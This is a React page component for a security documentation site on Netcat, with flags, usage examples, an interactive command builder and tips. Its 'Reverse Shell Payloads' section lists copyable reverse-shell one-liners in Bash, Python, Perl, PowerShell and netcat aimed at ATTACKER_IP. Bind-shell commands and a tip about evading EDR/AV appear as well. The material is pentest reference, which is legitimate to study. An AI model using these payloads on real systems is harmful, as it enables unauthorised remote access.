import { useState, useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import CodeBlock from '@/components/base/Codeblock';
import InlineCode from '@/components/base/InlineCode';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const useCases = [
  { icon: 'ri-terminal-line', name: 'Port Scanning', color: 'text-cyber-cyan', desc: 'Scan for open ports on a target host using TCP or UDP.' },
  { icon: 'ri-chat-3-line', name: 'Banner Grabbing', color: 'text-cyber-amber', desc: 'Connect to a service and read its banner to identify version info.' },
  { icon: 'ri-file-transfer-line', name: 'File Transfer', color: 'text-cyber-green', desc: 'Transfer files between systems without SCP or FTP.' },
  { icon: 'ri-server-line', name: 'Bind Shell', color: 'text-cyber-red', desc: 'Open a listening shell on the target that you connect to.' },
  { icon: 'ri-arrow-left-right-line', name: 'Reverse Shell', color: 'text-cyber-red', desc: 'Target connects back to your machine with a shell.' },
  { icon: 'ri-wifi-line', name: 'Port Forwarding', color: 'text-cyber-cyan', desc: 'Relay traffic from one port to another host/port.' },
  { icon: 'ri-chat-voice-line', name: 'Chat / Messaging', color: 'text-cyber-amber', desc: 'Simple two-way text communication between hosts.' },
  { icon: 'ri-pulse-line', name: 'Network Debugging', color: 'text-cyber-green', desc: 'Test connectivity, send raw data, and debug protocols.' },
];

const commonFlags = [
  { flag: '-l', desc: 'Listen mode — wait for incoming connections' },
  { flag: '-p <port>', desc: 'Specify local port number' },
  { flag: '-e <program>', desc: 'Execute program after connection (traditional nc)' },
  { flag: '-c <command>', desc: 'Execute shell command after connection' },
  { flag: '-u', desc: 'Use UDP instead of TCP' },
  { flag: '-v', desc: 'Verbose output' },
  { flag: '-vv', desc: 'Very verbose output' },
  { flag: '-n', desc: 'No DNS resolution (numeric IPs only)' },
  { flag: '-z', desc: 'Zero-I/O mode (port scanning)' },
  { flag: '-w <seconds>', desc: 'Timeout for connections' },
  { flag: '-k', desc: 'Keep listening after client disconnects (ncat)' },
  { flag: '-4', desc: 'Force IPv4' },
  { flag: '-6', desc: 'Force IPv6' },
  { flag: '--ssl', desc: 'Use SSL/TLS (ncat only)' },
  { flag: '--proxy <host:port>', desc: 'Use proxy (ncat only)' },
];

const shellPayloads = [
  { os: 'Linux/Unix', type: 'Bash', cmd: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' },
  { os: 'Linux/Unix', type: 'Python', cmd: "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"" },
  { os: 'Linux/Unix', type: 'Perl', cmd: "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
  { os: 'Windows', type: 'PowerShell', cmd: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" },
  { os: 'Linux/Unix', type: 'Netcat (with -e)', cmd: 'nc -e /bin/bash ATTACKER_IP 4444' },
  { os: 'Linux/Unix', type: 'Netcat (without -e)', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f' },
];

const examples = [
  { title: 'Connect to a TCP service', cmd: 'nc target.com 80' },
  { title: 'Listen on a port', cmd: 'nc -lvp 4444' },
  { title: 'Port scan (TCP)', cmd: 'nc -zv target.com 20-100' },
  { title: 'Port scan (UDP)', cmd: 'nc -zuv target.com 53 161 123' },
  { title: 'Banner grabbing (HTTP)', cmd: "echo -e 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc target.com 80" },
  { title: 'Banner grabbing (SMTP)', cmd: 'nc -v mail.target.com 25' },
  { title: 'Send file to listener', cmd: 'nc -lvp 4444 > received_file.txt' },
  { title: 'Transfer file to listener', cmd: 'nc target.com 4444 < file_to_send.txt' },
  { title: 'Bind shell (listener)', cmd: 'nc -lvp 4444 -e /bin/bash' },
  { title: 'Connect to bind shell', cmd: 'nc target.com 4444' },
  { title: 'Catch reverse shell', cmd: 'nc -lvp 4444' },
  { title: 'Simple chat (listener)', cmd: 'nc -lvp 1234' },
  { title: 'Simple chat (connect)', cmd: 'nc target.com 1234' },
];

export default function NetcatPage() {
  const [activeUseCase, setActiveUseCase] = useState<string | null>(null);
  const [builderMode, setBuilderMode] = useState('connect');
  const [builderHost, setBuilderHost] = useState('target.com');
  const [builderPort, setBuilderPort] = useState('4444');
  const [builderProto, setBuilderProto] = useState('tcp');
  const [builderExec, setBuilderExec] = useState('');
  const [builderFlags, setBuilderFlags] = useState<string[]>(['-v']);
  const [copied, setCopied] = useState(false);
  const [copiedShell, setCopiedShell] = useState<string | null>(null);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const toggleFlag = (flag: string) => {
    setBuilderFlags((prev) =>
      prev.includes(flag) ? prev.filter((f) => f !== flag) : [...prev, flag]
    );
  };

  const getGeneratedCommand = () => {
    let cmd = 'nc';
    if (builderMode === 'listen') cmd += ' -lvp';
    else if (builderMode === 'scan') cmd += ' -zv';
    else cmd += '';
    if (builderProto === 'udp') cmd += ' -u';
    builderFlags.filter((f) => f !== '-v').forEach((f) => { cmd += ` ${f}`; });
    if (builderMode !== 'listen') cmd += ` ${builderHost}`;
    cmd += ` ${builderPort}`;
    if (builderExec) cmd += ` -e ${builderExec}`;
    return cmd;
  };

  const copyCmd = () => {
    navigator.clipboard.writeText(getGeneratedCommand());
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const copyShell = (cmd: string, key: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedShell(key);
    setTimeout(() => setCopiedShell(null), 2000);
  };

  return (
      <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
        {/* Header */}
        <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
          <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-cyan/10 border border-cyber-cyan/20 text-cyber-cyan text-xs font-medium font-mono mb-4">
            <i className="ri-terminal-box-line" />
            Networking Swiss Army Knife
          </div>
          <DocHeading level={1}>Netcat (nc)</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            <strong className="text-white">Netcat</strong> is a versatile networking utility that reads and writes data across network connections using TCP or UDP.
            Often called the &quot;Swiss Army Knife&quot; of networking, it is used for port scanning, banner grabbing, file transfer, reverse shells, bind shells, and network debugging.
            Available as <InlineCode>nc</InlineCode>, <InlineCode>ncat</InlineCode> (Nmap version), and <InlineCode>netcat</InlineCode>.
          </p>
        </motion.div>

        {/* Use Cases */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="use-cases">Use Cases</DocHeading>
          <div className="mt-4 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {useCases.map((uc) => (
              <button
                key={uc.name}
                type="button"
                onClick={() => setActiveUseCase(activeUseCase === uc.name ? null : uc.name)}
                className={`cyber-card p-4 text-left cursor-pointer ${activeUseCase === uc.name ? 'border-cyber-cyan' : ''}`}
              >
                <div className={`w-9 h-9 rounded-lg bg-cyber-bg flex items-center justify-center mb-2 ${uc.color}`}>
                  <i className={`${uc.icon} text-lg`} />
                </div>
                <h4 className={`text-sm font-semibold ${uc.color}`}>{uc.name}</h4>
                <p className="text-xs text-cyber-text-muted mt-1">{uc.desc}</p>
              </button>
            ))}
          </div>
        </motion.section>

        {/* Installation */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="installation">Installation</DocHeading>
          <div className="mt-4 space-y-4">
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Linux (usually pre-installed)</h4>
              <CodeBlock code={"# Check if installed\nnc --version\n\n# Install traditional netcat\nsudo apt install netcat-traditional\n\n# Install ncat (Nmap version, recommended)\nsudo apt install ncat"} />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">macOS</h4>
              <CodeBlock code={"# Built-in nc (BSD version)\nnc --version\n\n# Install ncat via Homebrew\nbrew install nmap  # includes ncat"} />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Windows</h4>
              <CodeBlock code={"# Download ncat from nmap.org\n# Or use PowerShell equivalent:\nTest-NetConnection -ComputerName target.com -Port 80"} />
            </div>
          </div>
          <Callout type="info" className="mt-4">
            <strong>ncat</strong> (from Nmap) is the modern, feature-rich version with SSL support, proxy support, and the <InlineCode>-k</InlineCode> flag for persistent listening.
          </Callout>
        </motion.section>

        {/* Common Flags */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="flags">Common Flags Reference</DocHeading>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-2">
            {commonFlags.map((f) => (
              <div key={f.flag} className="flex items-start gap-3 p-3 rounded-lg bg-cyber-bg-card/50 border border-cyber-border">
                <span className="font-mono text-xs px-2 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan flex-shrink-0 whitespace-nowrap">{f.flag}</span>
                <span className="text-sm text-cyber-text-muted">{f.desc}</span>
              </div>
            ))}
          </div>
        </motion.section>

        {/* Reverse Shell Payloads */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="shells">Reverse Shell Payloads</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            First, start a listener on your machine: <InlineCode>nc -lvp 4444</InlineCode>
            <br />
            Then execute one of these payloads on the target (replace ATTACKER_IP with your IP):
          </p>
          <Callout type="danger" className="mt-4">
            Only use reverse shells on systems you own or have explicit written authorization to test. Unauthorized access is a criminal offense.
          </Callout>
          <div className="mt-4 space-y-3">
            {shellPayloads.map((s, i) => (
              <div key={i} className="cyber-card p-4">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2">
                    <span className="text-xs px-2 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-text-dim">{s.os}</span>
                    <span className="text-xs font-semibold text-cyber-amber">{s.type}</span>
                  </div>
                  <button
                    type="button"
                    onClick={() => copyShell(s.cmd, `${s.os}-${s.type}`)}
                    className="text-xs text-cyber-cyan hover:text-cyber-cyan-dim transition-colors flex items-center gap-1"
                  >
                    <i className={copiedShell === `${s.os}-${s.type}` ? 'ri-check-line' : 'ri-file-copy-line'} />
                    {copiedShell === `${s.os}-${s.type}` ? 'Copied!' : 'Copy'}
                  </button>
                </div>
                <code className="text-xs font-mono text-cyber-green break-all leading-relaxed">{s.cmd}</code>
              </div>
            ))}
          </div>
        </motion.section>

        {/* Examples */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="examples">Usage Examples</DocHeading>
          <div className="mt-4 space-y-4">
            {examples.map((ex, i) => (
              <div key={i}>
                <h4 className="text-sm font-semibold text-white mb-2">{ex.title}</h4>
                <CodeBlock code={ex.cmd} />
              </div>
            ))}
          </div>
        </motion.section>

        {/* Interactive Builder */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="builder">Interactive Command Builder</DocHeading>
          <div className="mt-5 cyber-card p-5 md:p-6">
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Mode</label>
              <div className="flex flex-wrap gap-2">
                {['connect', 'listen', 'scan'].map((m) => (
                  <button key={m} type="button" onClick={() => setBuilderMode(m)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all whitespace-nowrap capitalize ${builderMode === m ? 'bg-cyber-cyan/10 border-cyber-cyan text-cyber-cyan' : 'bg-cyber-bg border-cyber-border text-cyber-text-muted hover:border-cyber-cyan/50'}`}>
                    {m}
                  </button>
                ))}
              </div>
            </div>
            {builderMode !== 'listen' && (
              <div className="mb-4">
                <label className="text-sm font-semibold text-white block mb-2">Target Host</label>
                <input type="text" value={builderHost} onChange={(e) => setBuilderHost(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-cyan"
                  placeholder="target.com or 10.0.0.1" />
              </div>
            )}
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Port</label>
              <input type="text" value={builderPort} onChange={(e) => setBuilderPort(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-cyan"
                placeholder="4444 or 20-100" />
            </div>
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Protocol</label>
              <div className="flex gap-2">
                {['tcp', 'udp'].map((p) => (
                  <button key={p} type="button" onClick={() => setBuilderProto(p)}
                    className={`px-4 py-2 rounded-lg text-xs font-mono border transition-all whitespace-nowrap uppercase ${builderProto === p ? 'bg-cyber-cyan/10 border-cyber-cyan text-cyber-cyan' : 'bg-cyber-bg border-cyber-border text-cyber-text-muted hover:border-cyber-cyan/50'}`}>
                    {p}
                  </button>
                ))}
              </div>
            </div>
            {builderMode === 'listen' && (
              <div className="mb-4">
                <label className="text-sm font-semibold text-white block mb-2">Execute Program (optional)</label>
                <input type="text" value={builderExec} onChange={(e) => setBuilderExec(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-cyan"
                  placeholder="/bin/bash" />
              </div>
            )}
            <div className="mb-5">
              <label className="text-sm font-semibold text-white block mb-2">Extra Flags</label>
              <div className="flex flex-wrap gap-2">
                {['-n', '-w 3', '-k'].map((f) => (
                  <button key={f} type="button" onClick={() => toggleFlag(f)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all whitespace-nowrap ${builderFlags.includes(f) ? 'bg-cyber-cyan/10 border-cyber-cyan text-cyber-cyan' : 'bg-cyber-bg border-cyber-border text-cyber-text-muted hover:border-cyber-cyan/50'}`}>
                    {f}
                  </button>
                ))}
              </div>
            </div>
            <div className="bg-cyber-bg border border-cyber-border rounded-lg p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-semibold text-cyber-cyan">Generated Command</span>
                <button type="button" onClick={copyCmd} className="text-xs text-cyber-cyan hover:text-cyber-cyan-dim transition-colors flex items-center gap-1">
                  <i className={copied ? 'ri-check-line' : 'ri-file-copy-line'} />
                  {copied ? 'Copied!' : 'Copy'}
                </button>
              </div>
              <code className="text-sm font-mono text-cyber-green break-all">{getGeneratedCommand()}</code>
            </div>
          </div>
        </motion.section>

        {/* Tips */}
        <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="tips">Pro Tips</DocHeading>
          <div className="mt-4 space-y-3">
            <Callout type="tip">Use <InlineCode>ncat -k -lvp 4444</InlineCode> to keep listening after a client disconnects — great for catching multiple reverse shells.</Callout>
            <Callout type="info">If <InlineCode>-e</InlineCode> is not available (OpenBSD nc), use the FIFO trick with mkfifo and redirect output through a named pipe to achieve the same shell behavior.</Callout>
            <Callout type="tip">Upgrade a basic shell to a fully interactive TTY: <InlineCode>python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</InlineCode></Callout>
            <Callout type="warning">Reverse shells are often caught by EDR/AV. Consider using encrypted channels (ncat --ssl) or other evasion techniques.</Callout>
          </div>
        </motion.section>
      </div>
  );
}
